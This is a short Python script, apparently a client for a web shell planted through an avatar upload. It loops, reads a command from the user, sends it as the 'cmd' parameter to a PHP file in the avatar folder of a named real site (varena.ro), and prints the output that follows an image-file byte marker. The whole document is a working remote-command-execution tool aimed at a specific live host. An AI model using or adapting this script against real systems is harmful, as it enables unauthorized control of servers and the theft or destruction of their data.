import requests, sys, base64

print ("Welcome to VArena :^)")
while True:
    sys.stdout.write ("> ")
    sys.stdout.flush()
    cmd = input()
    r = requests.get ('http://varena.ro/avatar/full/test.php?cmd=' + cmd)
    print (r.text[r.text.find('\xE2\x1A\x57\x29\x01\x01\x00\x3B') + 10:])
